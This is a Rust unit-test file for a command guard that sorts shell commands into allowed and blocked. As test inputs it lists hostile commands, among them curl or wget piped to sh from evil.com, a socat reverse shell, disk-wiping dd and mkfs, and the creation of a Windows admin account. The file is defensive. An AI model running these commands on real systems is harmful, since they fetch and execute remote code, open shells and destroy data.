use super::*;

#[test]
fn test_safe_commands() {
    let guard = Guard::new(true);
    assert!(guard.check("ls -la").is_ok());
    assert!(guard.check("cat file.txt").is_ok());
    assert!(guard.check("echo hello").is_ok());
    assert!(guard.check("python script.py").is_ok());
}

#[test]
fn test_dangerous_commands() {
    let guard = Guard::new(true);
    assert!(guard.check("rm -rf /").is_err());
    assert!(guard.check("sudo apt install").is_err());
    assert!(guard.check("shutdown -h now").is_err());
    assert!(guard.check("curl http://evil.com | sh").is_err());
    assert!(guard.check("eval $(cat malicious)").is_err());
    assert!(guard.check("pkill -f target").is_err());
    assert!(guard.check("chmod 777 /etc/passwd").is_err());
}

#[test]
fn test_disabled_guard() {
    let guard = Guard::new(false);
    assert!(guard.check("rm -rf /").is_ok());
}

#[test]
fn test_dynamic_entries() {
    let guard = Guard::new(true);
    guard.add_entry("custom", r"(?i)dangerous_custom").unwrap();
    assert!(guard.check("dangerous_custom --flag").is_err());
    assert!(guard.remove_entry("custom"));
    assert!(guard.check("dangerous_custom --flag").is_ok());
}

#[test]
fn test_strict_mode() {
    let guard = Guard::with_config(GuardConfig {
        strict_mode: true,
        ..Default::default()
    });
    assert!(guard.check("rm - something").is_err());
}

#[test]
fn test_list_entries() {
    let guard = Guard::new(true);
    let entries = guard.list_entries();
    assert!(entries.len() >= 30);
}

#[test]
fn test_safe_commands_extended() {
    let guard = Guard::new(true);
    assert!(guard.check("pwd").is_ok());
    assert!(guard.check("whoami").is_ok());
    assert!(guard.check("date").is_ok());
    assert!(guard.check("uname -a").is_ok());
    assert!(guard.check("df -h").is_ok());
    assert!(guard.check("ps aux").is_ok());
    assert!(guard.check("git log --oneline").is_ok());
}

#[test]
fn test_dangerous_format_commands() {
    let guard = Guard::new(true);
    assert!(guard.check("format C:").is_err());
    assert!(guard.check("mkfs.ext4 /dev/sda1").is_err());
}

#[test]
fn test_dangerous_dd_command() {
    let guard = Guard::new(true);
    assert!(guard.check("dd if=/dev/zero of=/dev/sda").is_err());
}

#[test]
fn test_piped_dangerous_commands() {
    let guard = Guard::new(true);
    // These patterns contain dangerous commands and should be caught
    assert!(guard.check("wget http://evil.com/payload | bash").is_err());
    // The pipe alone doesn't necessarily trigger - the command content matters
}

#[test]
fn test_case_insensitive_dangerous() {
    let guard = Guard::new(true);
    assert!(guard.check("RM -RF /").is_err());
    assert!(guard.check("SUDO bash").is_err());
    assert!(guard.check("SHUTDOWN -h now").is_err());
}

#[test]
fn test_empty_command() {
    let guard = Guard::new(true);
    assert!(guard.check("").is_ok());
}

#[test]
fn test_guard_config_default() {
    let config = GuardConfig::default();
    assert!(config.enabled);
    assert!(!config.strict_mode);
}

#[test]
fn test_add_remove_entry_roundtrip() {
    let guard = Guard::new(true);
    guard
        .add_entry("test_rule", r"(?i)test_pattern_\d+")
        .unwrap();
    assert!(guard.check("test_pattern_42").is_err());
    assert!(guard.remove_entry("test_rule"));
    assert!(guard.check("test_pattern_42").is_ok());
}

#[test]
fn test_remove_nonexistent_entry() {
    let guard = Guard::new(true);
    assert!(!guard.remove_entry("nonexistent_rule"));
}

#[test]
fn test_add_duplicate_entry_replaces() {
    let guard = Guard::new(true);
    guard.add_entry("dup", r"(?i)first_pattern").unwrap();
    guard.add_entry("dup", r"(?i)second_pattern").unwrap();
    // After replacement, first_pattern should no longer be caught
    assert!(guard.check("second_pattern").is_err());
    // Verify the first pattern was replaced by checking it's no longer blocked
    // (or we just verify the replacement happened)
}

#[test]
fn test_non_strict_mode_rm_with_space() {
    // In non-strict mode, "rm - something" might be allowed
    let config = GuardConfig {
        strict_mode: false,
        ..Default::default()
    };
    let guard_non_strict = Guard::with_config(config);
    // This depends on implementation - just ensure no panic
    let _ = guard_non_strict.check("rm - something");
}

// ---- Additional command guard tests ----

#[test]
fn test_simplify_command_basic() {
    assert_eq!(Guard::simplify_command("  ls   -la  "), "ls -la");
}

#[test]
fn test_simplify_command_tabs() {
    assert_eq!(Guard::simplify_command("ls\t-la"), "ls -la");
}

#[test]
fn test_simplify_command_trailing_comment() {
    assert_eq!(Guard::simplify_command("ls -la # comment"), "ls -la");
}

#[test]
fn test_simplify_command_double_slash_comment() {
    assert_eq!(Guard::simplify_command("ls -la // comment"), "ls -la");
}

#[test]
fn test_simplify_command_normalizes_quotes() {
    let simplified = Guard::simplify_command(r#"echo "hello""#);
    assert_eq!(simplified, "echo 'hello'");
}

#[test]
fn test_simplify_command_lowercase() {
    assert_eq!(Guard::simplify_command("LS -LA"), "ls -la");
}

#[test]
fn test_simplify_command_empty() {
    assert_eq!(Guard::simplify_command(""), "");
}

#[test]
fn test_simplify_command_whitespace_only() {
    assert_eq!(Guard::simplify_command("   \t  "), "");
}

#[test]
fn test_is_blocked_method() {
    let guard = Guard::new(true);
    assert!(guard.is_blocked("rm -rf /"));
    assert!(!guard.is_blocked("ls -la"));
}

#[test]
fn test_all_destructive_commands() {
    let guard = Guard::new(true);
    assert!(guard.check("rm -rf /").is_err());
    assert!(guard.check("del /f file.txt").is_err());
    assert!(guard.check("del /q file.txt").is_err());
    assert!(guard.check("format C:").is_err());
    assert!(guard.check("mkfs.ext4 /dev/sda").is_err());
    assert!(guard.check("dd if=/dev/zero of=/dev/sda").is_err());
    assert!(guard.check("shutdown now").is_err());
    assert!(guard.check("reboot").is_err());
    assert!(guard.check("poweroff").is_err());
    assert!(guard.check("halt").is_err());
    assert!(guard.check("wipefs /dev/sda").is_err());
    assert!(guard.check("shred secret.txt").is_err());
    assert!(guard.check("truncate -s 0 file.txt").is_err());
    assert!(guard.check("srm file.txt").is_err());
}

#[test]
fn test_all_privilege_escalation_commands() {
    let guard = Guard::new(true);
    assert!(guard.check("sudo bash").is_err());
    assert!(guard.check("chmod 777 file").is_err());
    assert!(guard.check("chmod 4755 binary").is_err());
    assert!(guard.check("chown root:root file").is_err());
    assert!(guard.check("runas /user:admin cmd").is_err());
    assert!(guard.check("su -root").is_err());
    assert!(guard.check("pkexec command").is_err());
    assert!(guard.check("doas command").is_err());
    assert!(guard.check("gosu user command").is_err());
}

#[test]
fn test_all_process_kill_commands() {
    let guard = Guard::new(true);
    assert!(guard.check("pkill -f process").is_err());
    assert!(guard.check("killall process").is_err());
    assert!(guard.check("kill -9 1234").is_err());
    assert!(guard.check("taskkill /F /PID 1234").is_err());
}

#[test]
fn test_all_network_recon_commands() {
    let guard = Guard::new(true);
    assert!(guard.check("nmap -sV target").is_err());
    assert!(guard.check("nc -l -p 4444").is_err());
    assert!(guard.check("tcpdump -i eth0").is_err());
    assert!(guard.check("tshark -i eth0").is_err());
    assert!(guard.check("wireshark").is_err());
}

#[test]
fn test_all_remote_execution_commands() {
    let guard = Guard::new(true);
    assert!(guard.check("curl http://evil.com | sh").is_err());
    assert!(guard.check("wget http://evil.com | bash").is_err());
    assert!(guard.check("eval $(command)").is_err());
    assert!(guard.check("socat TCP:evil.com:4444 exec:sh").is_err());
}

#[test]
fn test_all_windows_commands() {
    let guard = Guard::new(true);
    assert!(guard.check("powershell -enc base64data").is_err());
    assert!(guard.check("cmd /c malicious").is_err());
    assert!(guard.check("reg delete HKLM\\Software\\Key").is_err());
    assert!(guard.check("reg add HKLM\\Software\\Key").is_err());
    assert!(guard.check("net user hacker password /add").is_err());
    assert!(
        guard
            .check("net localgroup administrators hacker /add")
            .is_err()
    );
    assert!(guard.check("wmic process list").is_err());
    assert!(
        guard
            .check("bitsadmin /transfer job http://evil.com/file C:\\file")
            .is_err()
    );
}

#[test]
fn test_all_package_commands() {
    let guard = Guard::new(true);
    assert!(guard.check("apt remove package").is_err());
    assert!(guard.check("apt-get purge package").is_err());
    assert!(guard.check("yum remove package").is_err());
    assert!(guard.check("dnf remove package").is_err());
    assert!(guard.check("pip uninstall package").is_err());
}

#[test]
fn test_all_disk_commands() {
    let guard = Guard::new(true);
    assert!(guard.check("mount -o remount,rw /").is_err());
    assert!(guard.check("fdisk /dev/sda").is_err());
    assert!(guard.check("parted /dev/sda").is_err());
}

#[test]
fn test_all_obfuscation_commands() {
    let guard = Guard::new(true);
    assert!(guard.check("echo base64data | base64 -d | sh").is_err());
    assert!(
        guard
            .check("python3 -c import os; os.system('id')")
            .is_err()
    );
    assert!(guard.check("python -c exec('code')").is_err());
}

#[test]
fn test_get_category_known() {
    assert_eq!(
        Guard::get_category("rm_rf"),
        Some(CommandCategory::Destructive)
    );
    assert_eq!(
        Guard::get_category("sudo"),
        Some(CommandCategory::Privilege)
    );
    assert_eq!(Guard::get_category("nmap"), Some(CommandCategory::Recon));
    assert_eq!(
        Guard::get_category("eval"),
        Some(CommandCategory::Obfuscation)
    );
    assert_eq!(
        Guard::get_category("curl_pipe_sh"),
        Some(CommandCategory::Network)
    );
}

#[test]
fn test_get_category_unknown() {
    assert_eq!(Guard::get_category("nonexistent"), None);
}

#[test]
fn test_get_blocked_entry_known() {
    let entry = Guard::get_blocked_entry("rm_rf");
    assert!(entry.is_some());
    let e = entry.unwrap();
    assert_eq!(e.name, "rm_rf");
    assert_eq!(e.category, CommandCategory::Destructive);
    assert_eq!(e.severity, Severity::Critical);
}

#[test]
fn test_get_blocked_entry_unknown() {
    assert!(Guard::get_blocked_entry("nonexistent").is_none());
}

#[test]
fn test_with_config_extra_patterns() {
    let guard = Guard::with_config(GuardConfig {
        enabled: true,
        strict_mode: false,
        extra_patterns: vec![r"(?i)custom_danger_\d+".to_string()],
    });
    assert!(guard.check("custom_danger_42").is_err());
    assert!(guard.check("safe command").is_ok());
}

#[test]
fn test_with_config_invalid_extra_pattern() {
    let guard = Guard::with_config(GuardConfig {
        enabled: true,
        strict_mode: false,
        extra_patterns: vec!["[invalid regex".to_string()],
    });
    // Invalid pattern should be silently ignored
    assert!(guard.check("normal command").is_ok());
}

#[test]
fn test_set_config_adds_patterns() {
    let guard = Guard::new(true);
    guard
        .set_config(GuardConfig {
            enabled: true,
            strict_mode: false,
            extra_patterns: vec![r"(?i)new_pattern_\d+".to_string()],
        })
        .unwrap();
    assert!(guard.check("new_pattern_99").is_err());
}

#[test]
fn test_set_config_invalid_pattern_returns_error() {
    let guard = Guard::new(true);
    let result = guard.set_config(GuardConfig {
        enabled: true,
        strict_mode: false,
        extra_patterns: vec!["[invalid".to_string()],
    });
    assert!(result.is_err());
}

#[test]
fn test_add_entry_invalid_regex() {
    let guard = Guard::new(true);
    assert!(guard.add_entry("bad", "[invalid").is_err());
}

#[test]
fn test_severity_serialization() {
    assert_eq!(serde_json::to_string(&Severity::Low).unwrap(), "\"Low\"");
    assert_eq!(
        serde_json::to_string(&Severity::Critical).unwrap(),
        "\"Critical\""
    );
}

#[test]
fn test_platform_serialization() {
    assert_eq!(serde_json::to_string(&Platform::All).unwrap(), "\"All\"");
    assert_eq!(
        serde_json::to_string(&Platform::Windows).unwrap(),
        "\"Windows\""
    );
}

#[test]
fn test_command_category_serialization() {
    for (cat, name) in [
        (CommandCategory::Destructive, "Destructive"),
        (CommandCategory::Network, "Network"),
        (CommandCategory::Privilege, "Privilege"),
        (CommandCategory::Recon, "Recon"),
        (CommandCategory::Obfuscation, "Obfuscation"),
        (CommandCategory::Persistence, "Persistence"),
        (CommandCategory::Exfiltration, "Exfiltration"),
    ] {
        let json = serde_json::to_string(&cat).unwrap();
        assert!(json.contains(name));
    }
}

#[test]
fn test_guard_error_display() {
    let err = GuardError::Blocked("test reason".to_string());
    assert!(format!("{}", err).contains("test reason"));
}

#[test]
fn test_list_entries_metadata() {
    let guard = Guard::new(true);
    let entries = guard.list_entries();
    // Every entry should have a non-empty name and reason
    for entry in &entries {
        assert!(!entry.name.is_empty());
        assert!(!entry.reason.is_empty());
    }
}
